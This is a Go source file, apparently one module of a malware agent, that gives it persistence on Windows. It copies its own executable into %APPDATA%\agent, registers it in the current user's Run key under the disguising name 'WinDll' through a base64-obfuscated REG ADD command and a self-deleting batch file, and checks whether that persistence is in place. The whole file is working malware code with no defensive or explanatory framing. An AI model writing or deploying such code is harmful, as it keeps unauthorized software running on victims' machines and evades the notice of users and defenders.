package main

import (
	"encoding/base64"
	"log"
	"os"
	"os/exec"
	"strings"
)

func Persistence() {
	//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\agent\agent.exe
	var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVhcHBkYXRhJVxhZ2VudFxhZ2VudC5leGU="
	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

	// create PERSIST.bat file
	PERSIST, _ := os.Create("PERSIST.bat")

	PERSIST.WriteString("mkdir %appdata%\\agent" + "\n")
	PERSIST.WriteString("copy " + os.Args[0] + " %appdata%\\agent\\agent.exe\n")
	PERSIST.WriteString(string(DecodedRegAdd))

	PERSIST.Close()

	// execute PERSIST.bat file
	Exec := exec.Command("cmd", "/C", "PERSIST.bat")
	// Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Exec.Run()

	// delete PERSIST.bat file
	Clean := exec.Command("cmd", "/C", "del PERSIST.bat")
	// Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	Clean.Run()

}

func IsPersistent() bool {

	// check if REG QUERY HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll

	var RegCheck = "UkVHIFFVRVJZIEhLQ1VcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC9WIFdpbkRsbA=="
	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegCheck)

	Output := exec.Command("cmd", string(DecodedRegAdd))
	// Output.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := Output.Output()

	if err != nil {
		log.Fatal(err)
	}
	return strings.Contains(string(out), "agent.exe")
}
